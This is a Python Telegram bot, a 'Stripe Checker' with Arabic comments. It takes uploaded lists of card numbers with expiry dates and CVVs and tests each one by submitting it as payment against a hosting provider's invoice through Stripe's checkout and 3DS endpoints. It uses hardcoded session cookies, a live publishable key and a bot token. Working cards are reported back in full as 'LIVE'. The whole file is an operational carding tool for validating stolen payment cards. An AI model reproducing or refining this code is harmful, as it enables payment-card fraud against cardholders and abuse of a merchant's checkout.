import telebot
from telebot import types
import threading
import time
import requests
import re
from bs4 import BeautifulSoup
import urllib3

# إعدادات المستخدم
TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379
INVOICE_ID = 260528

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ألوان للطباعة
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

# تخزين مؤقت
user_cards = {}
checking_status = {}

def fetch_invoice_data(invoice_id):
    url = f"https://vsys.host/viewinvoice.php?id={invoice_id}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    cookies = {
        'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
        'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
        '_ga': 'GA1.1.1641871625.1761294273',
        '_gcl_au': '1.1.1086970495.1761294272',
        'VsysFirstVisit': '1761302393',
        '_ga_248YG9EFT7': 'GS2.1.s1761302293$o3$g1$t1761302439$j48$l1$h530568902',
    }
    try:
        session = requests.Session()
        response = session.get(url, headers=headers, cookies=cookies, timeout=20, verify=False)
        response.raise_for_status()
        new_cookies = session.cookies.get_dict()
        stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
        stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
        soup = BeautifulSoup(response.text, 'html.parser')
        m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
        session_id = m.group(0).split('/pay/')[1].split('#')[0] if m and '/pay/' in m.group(0) else ''
        total_row = soup.find('tr', class_='total-row') or soup.select_one('tr:contains("Total")')
        if not total_row:
            return None, None, None, None, f"{Colors.RED}❌ Total amount not found{Colors.RESET}"
        total_amount_text = total_row.find_all('td')[1].text.replace('$', '').strip()
        total_amount = int(float(total_amount_text) * 100) if total_amount_text else 0
        if not session_id or not total_amount:
            return None, None, None, None, f"{Colors.RED}❌ Failed to fetch session_id or amount{Colors.RESET}"
        return session_id, total_amount, stripe_mid, stripe_sid, None
    except Exception as e:
        return None, None, None, None, f"{Colors.RED}❌ Error fetching invoice: {str(e)[:50]}{Colors.RESET}"

def check_card(card_details, invoice_id):
    session_id, total_amount, stripe_mid, stripe_sid, error = fetch_invoice_data(invoice_id)
    if error:
        return error
    try:
        parts = card_details.strip().split('|')
        if len(parts) != 4:
            return f"{Colors.RED}❌ Invalid format{Colors.RESET}"
        card_number, exp_month, exp_year, cvc = parts
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6793.65 Safari/537.36',
        }
        data_pm = (
            f'type=card&card[number]={card_number}&card[cvc]={cvc}&'
            f'card[exp_month]={exp_month}&card[exp_year]={exp_year}&'
            'billing_details[name]=Card+details+saad&'
            'billing_details[email]=renes98352%40neuraxo.com&'
            'billing_details[address][country]=IT&'
            'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
            f'muid={stripe_mid}&'
            f'sid={stripe_sid}&'
            'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
            'payment_user_agent=stripe.js%2F6440ee8f22%3B+stripe-js-v3%2F6440ee8f22%3B+checkout'
        )
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=20)
        pm_res = r1.json()
        if 'id' not in pm_res:
            return f"{Colors.RED}❌ {pm_res.get('error', {}).get('message', 'Failed to create PM')}{Colors.RESET}"
        pm_id = pm_res['id']
        data_confirm = (
            f'eid=NA&payment_method={pm_id}&expected_amount={total_amount}&'
            f'last_displayed_line_item_group_details[subtotal]={total_amount}&'
            'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
            'last_displayed_line_item_group_details[total_inclusive_tax]=0&'
            'last_displayed_line_item_group_details[total_discount_amount]=0&'
            'last_displayed_line_item_group_details[shipping_rate_amount]=0&'
            'expected_payment_method_type=card&'
            'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
            f'muid={stripe_mid}&'
            f'sid={stripe_sid}&'
            'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
            'version=6440ee8f22'
        )
        r2 = requests.post(
            f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
            headers=headers, data=data_confirm, timeout=20
        )
        confirm_res = r2.json()
        if 'payment_intent' not in confirm_res:
            time.sleep(5)
            new_session_id, new_total_amount, new_stripe_mid, new_stripe_sid, error = fetch_invoice_data(invoice_id)
            if error:
                return f"{Colors.RED}❌ Failed to fetch new session: {error}{Colors.RESET}"
            return check_card(card_details, invoice_id)
        pi = confirm_res['payment_intent']
        status = pi.get('status', 'unknown')
        if status == 'requires_action':
            next_action = pi.get('next_action', {})
            if next_action.get('type') == 'use_stripe_sdk':
                source_id = next_action.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
                if not source_id:
                    return f"{Colors.RED}❌ No 3DS source{Colors.RESET}"
                data_3ds = (
                    f'source={source_id}&'
                    'browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+WOW64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F133.0.6793.65+Safari%2F537.36%22%7D&'
                    'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                )
                r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
                tds_res = r3.json()
                trans_status = tds_res.get('ares', {}).get('transStatus', '?')
                if trans_status == 'N':
                    return f"{Colors.GREEN}✅ Live - transStatus: N{Colors.RESET}"
                elif trans_status == 'R':
                    return f"{Colors.RED}❌ Rejected - transStatus: R{Colors.RESET}"
                elif trans_status == 'C':
                    return f"{Colors.YELLOW}⚠️ Challenge - transStatus: C{Colors.RESET}"
                elif trans_status == 'Y':
                    return f"{Colors.GREEN}✅ Approved - transStatus: Y{Colors.RESET}"
                else:
                    return f"{Colors.BLUE}ℹ️ transStatus: {trans_status}{Colors.RESET}"
            else:
                return f"{Colors.RED}❌ Next action: {next_action.get('type', 'unknown')}{Colors.RESET}"
        elif status == 'succeeded':
            return f"{Colors.GREEN}✅ Approved Direct{Colors.RESET}"
        else:
            error = pi.get('last_payment_error', {})
            msg = error.get('message', error.get('code', status))
            return f"{Colors.RED}❌ {msg}{Colors.RESET}"
    except Exception as e:
        return f"{Colors.RED}❌ Error: {str(e)[:50]}{Colors.RESET}"

@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    bot.send_message(message.chat.id, f"<b>🎉 Welcome {username}!\n\n🔹 Stripe Checker Bot\n━━━━━━━━━━━━━━━━━━━━\n📤 Send a combo file or single card (Card|MM|YYYY|CVV).</b>")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8", errors='ignore').splitlines()
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line and len(line.split('|')) == 4:
                cards.append({'raw': line})
        if not cards:
            bot.reply_to(message, "❌ No valid cards found (Card|MM|YYYY|CVV)")
            return
        user_cards[user_id] = cards
        checking_status[user_id] = False
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        bot.send_message(message.chat.id, f"<b>✅ File Uploaded!\n💳 Total: {len(cards)}\n⚡ Status: Ready</b>", reply_markup=keyboard)
    except Exception as e:
        bot.reply_to(message, f"❌ Error reading file: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already running!")
        return
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text="⏳ Initializing checker...")
    live = approved = challenge = rejected = errors = checked = 0
    start_time = time.time()
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        checked += 1
        result = check_card(card['raw'], INVOICE_ID)
        card['result'] = result
        card_num = card['raw'].split('|')[0]
        masked = f"{card_num[:4]}****{card_num[-4:]}" if len(card_num) >= 8 else card_num
        if "✅" in result:
            live += 1
            bot.send_message(user_id, f"<b>✅ LIVE\nCard: <code>{card['raw']}</code>\nResult: {result}</b>")
        elif "⚠️ Challenge" in result:
            challenge += 1
        elif "❌ Rejected" in result or "❌" in result:
            rejected += 1
        else:
            errors += 1
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"<b>🔹 Checking\n{progress_bar}\n⏱ Elapsed: {int(elapsed)}s | Speed: {speed:.2f} ips\n💳 Current: {masked}</b>"
            )
        except:
            pass
        time.sleep(5)
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"<b>✅ Check Completed!\n━━━━━━━━━━━━━━━━━━━━\n📊 Summary:\n├ Total: {total}\n├ LIVE: {live}\n├ Approved: {approved}\n├ Challenge: {challenge}\n├ Rejected: {rejected}\n├ Errors: {errors}\n⏱ Time: {int(total_time)}s</b>"
    )
    checking_status[user_id] = False

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Check stopped!")

@bot.message_handler(commands=['help'])
def help_message(message):
    bot.send_message(message.chat.id, "<b>📚 Commands:\n/start - Start bot\n/help - This message\n\nSend a file or single card (Card|MM|YYYY|CVV)</b>")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        user_cards[message.from_user.id] = [{'raw': text}]
        checking_status[message.from_user.id] = False
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        card_num = text.split('|')[0]
        masked = f"{card_num[:4]}****{card_num[-4:]}" if len(card_num) >= 8 else card_num
        bot.send_message(message.chat.id, f"<b>✅ Card Loaded!\n💳 Card: <code>{masked}</code>\n⚡ Status: Ready</b>", reply_markup=keyboard)
    else:
        bot.reply_to(message, "<b>❌ Invalid format! Use: Card|MM|YYYY|CVV</b>")

if __name__ == "__main__":
    print("🚀 Starting Stripe Checker Bot...")
    bot.polling(none_stop=True)
